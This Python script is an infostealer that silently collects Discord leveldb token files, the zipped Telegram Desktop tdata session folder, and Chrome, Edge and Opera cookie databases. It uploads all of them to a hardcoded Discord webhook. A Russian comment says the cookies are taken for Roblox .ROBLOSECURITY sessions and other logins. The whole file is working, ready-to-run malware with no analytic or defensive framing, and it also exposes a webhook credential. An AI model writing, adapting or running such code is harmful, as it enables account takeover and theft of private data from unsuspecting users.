import os
import shutil
import requests

WEBHOOK_URL = "https://discordapp.com/api/webhooks/1550235401044758630/RISMeYhdwqFRCKxnDng4_gZhUicWG_m-PAHmkbyeKfIVTe9iB5jI5pEOQuMBO-LHs1M6"

def send_file(file_path, filename):
    if os.path.exists(file_path):
        try:
            with open(file_path, "rb") as f:
                requests.post(
                    WEBHOOK_URL,
                    files={"file": (filename, f)}
                )
        except:
            pass

def grab_discord():
    local = os.path.expanduser('~') + '\\AppData\\Local\\Discord'
    if not os.path.exists(local):
        return
    for root, dirs, files in os.walk(local):
        for file in files:
            if file.endswith('.ldb') or file.endswith('.log'):
                path = os.path.join(root, file)
                if 'Local Storage\\leveldb' in path:
                    send_file(path, f"discord_{file}")

def grab_telegram():
    tdata = os.path.expanduser('~') + '\\AppData\\Roaming\\Telegram Desktop\\tdata'
    if os.path.exists(tdata):
        shutil.make_archive('tdata_dump', 'zip', tdata)
        send_file('tdata_dump.zip', 'tdata_telegram.zip')
        os.remove('tdata_dump.zip')

def grab_browsers_and_roblox():
    local_appdata = os.path.expanduser('~') + '\\AppData\\Local'
    browsers = {
        'Chrome': '\\Google\\Chrome\\User Data\\Default\\Network\\Cookies',
        'Edge': '\\Microsoft\\Edge\\User Data\\Default\\Network\\Cookies',
        'Opera': '\\Software\\Opera Software\\Opera Stable\\Cookies'
    }
    for name, path in browsers.items():
        full_path = local_appdata + path
        # Отправляем базы кук, внутри которых лежит сессия Roblox (.ROBLOSECURITY) и другие авторизации
        send_file(full_path, f"{name}_Cookies_Roblox.db")

if __name__ == "__main__":
    grab_discord()
    grab_telegram()
    grab_browsers_and_roblox()